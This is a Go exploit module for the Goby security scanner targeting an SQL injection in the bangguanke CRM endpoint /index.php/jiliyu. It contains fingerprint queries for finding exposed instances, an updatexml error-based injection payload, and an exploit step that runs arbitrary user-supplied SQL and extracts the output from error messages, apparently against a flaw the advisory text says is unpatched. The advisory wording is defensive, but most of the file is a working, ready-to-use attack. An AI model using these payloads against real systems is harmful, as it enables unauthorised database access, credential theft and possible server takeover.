package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "bangguanke CRM /index.php/jiliyu SQL Injection Vulnerability",
    "Description": "<p>Helper CRM is a software product that focuses on customer relationship management and is designed to help enterprises and organisations better manage customer information, improve sales efficiency, enhance customer interaction and increase customer satisfaction. In addition to using the SQL injection vulnerability to gain access to information in the database (e.g., administrator backend passwords, site user information), an attacker can even write data to the server to gain further access to the server system in high-privileged situations.</p>",
    "Product": "BANGGUANKE-CRM",
    "Homepage": "https://www.bgkcrm.com/",
    "DisclosureDate": "2024-03-10",
    "PostTime": "2024-03-26",
    "Author": "lidingke@baimaohui.net",
    "FofaQuery": "(title=\"用户登录\" && body=\"/themes/default/js/jquery.code.js\") || header=\"Set-Cookie: bgk_session=a%3A5\" || body=\"<p id=\\\"admintips\\\" >初始账号：admin\" || banner=\"Set-Cookie: bgk_session=a%3A5\"",
    "GobyQuery": "(title=\"用户登录\" && body=\"/themes/default/js/jquery.code.js\") || header=\"Set-Cookie: bgk_session=a%3A5\" || body=\"<p id=\\\"admintips\\\" >初始账号：admin\" || banner=\"Set-Cookie: bgk_session=a%3A5\"",
    "Level": "2",
    "Impact": "<p>In addition to using the SQL injection vulnerability to gain access to information in the database (e.g., administrator backend passwords, site user information), an attacker can even write data to the server to gain further access to the server system in high-privileged situations.</p>",
    "Recommendation": "<p>1. Officials have not yet fixed the vulnerability. Please contact the vendor to fix the vulnerability: <a href=\"https://www.bgkcrm.com/\">https://www.bgkcrm.com/</a></p><p>2. Deploy Web application firewalls to monitor database operations.</p><p>3. Keep the system off the public web if it is not necessary.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom",
            "show": ""
        },
        {
            "name": "command",
            "type": "input",
            "value": "select%20user()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/index.php/jiliyu?keyword=1&page=1&pai=id&sou=soufast&timedsc=激励语列表&xu=and%201=(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "XPATH",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|lastbody|variable|/index.php/jiliyu?keyword=1&page=1&pai=id&sou=soufast&timedsc=激励语列表&xu=and%201=(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))",
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/index.php/jiliyu?keyword=1&page=1&pai=id&sou=soufast&timedsc=激励语列表&xu=and%201=(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/index.php/jiliyu?keyword=1&page=1&pai=id&sou=soufast&timedsc=激励语列表&xu=and%201=(updatexml(1,concat(0x7e,({{{command}}}),0x7e),1))",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "XPATH",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|XPATH syntax error: '(.*?)'"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.9",
    "Translation": {
        "CN": {
            "Name": "帮管客 CRM /index.php/jiliyu SQL注入漏洞",
            "Product": "帮管客-CRM",
            "Description": "<p>帮管客 CRM 是一款专注于客户关系管理的软件产品，旨在帮助企业和组织更好地管理客户信息、提高销售效率、增强客户互动和提升客户满意度。攻击者除了可以利⽤ SQL 注⼊漏洞获取数据库中的信息（例如，管理员后台密码、站点的⽤户个⼈信息）之外，甚⾄在⾼权限的情况可向服务器中写⼊⽊⻢，进⼀步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>1、官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"https://www.bgkcrm.com/\" target=\"_blank\">https://www.bgkcrm.com/</a><br></p><p>2、部署Web应⽤防⽕墙，对数据库操作进⾏监控。<br></p><p>3、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>攻击者除了可以利⽤ SQL 注⼊漏洞获取数据库中的信息（例如，管理员后台密码、站点的⽤户个⼈信息）之外，甚⾄在⾼权限的情况可向服务器中写⼊⽊⻢，进⼀步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "bangguanke CRM /index.php/jiliyu SQL Injection Vulnerability",
            "Product": "BANGGUANKE-CRM",
            "Description": "<p>Helper CRM is a software product that focuses on customer relationship management and is designed to help enterprises and organisations better manage customer information, improve sales efficiency, enhance customer interaction and increase customer satisfaction. In addition to using the SQL injection vulnerability to gain access to information in the database (e.g., administrator backend passwords, site user information), an attacker can even write data to the server to gain further access to the server system in high-privileged situations.<br></p>",
            "Recommendation": "<p>1. Officials have not yet fixed the vulnerability. Please contact the vendor to fix the vulnerability:&nbsp;<a href=\"https://www.bgkcrm.com/\" target=\"_blank\">https://www.bgkcrm.com/</a><br></p><p>2. Deploy Web application firewalls to monitor database operations.<br></p><p>3. Keep the system off the public web if it is not necessary.<br></p>",
            "Impact": "<p>In addition to using the SQL injection vulnerability to gain access to information in the database (e.g., administrator backend passwords, site user information), an attacker can even write data to the server to gain further access to the server system in high-privileged situations.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10938"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}